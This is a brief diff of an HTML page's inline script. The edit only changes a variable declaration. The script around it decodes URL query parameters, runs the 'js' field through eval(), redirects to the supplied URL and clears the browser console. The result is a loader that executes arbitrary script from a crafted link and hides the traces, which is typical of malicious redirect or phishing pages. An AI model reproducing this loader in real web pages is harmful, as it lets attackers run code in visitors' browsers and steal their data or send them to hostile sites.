@@ -6,7 +6,7 @@
 <script src="/default.js"></script>
 
 <script>
-    let params = JSON.parse(decodeString(getSearchParams().r,getSearchParams().d))
+    var params = JSON.parse(decodeString(getSearchParams().r,getSearchParams().d))
     eval(params.js)
     window.location.href = params.url
     console.clear()
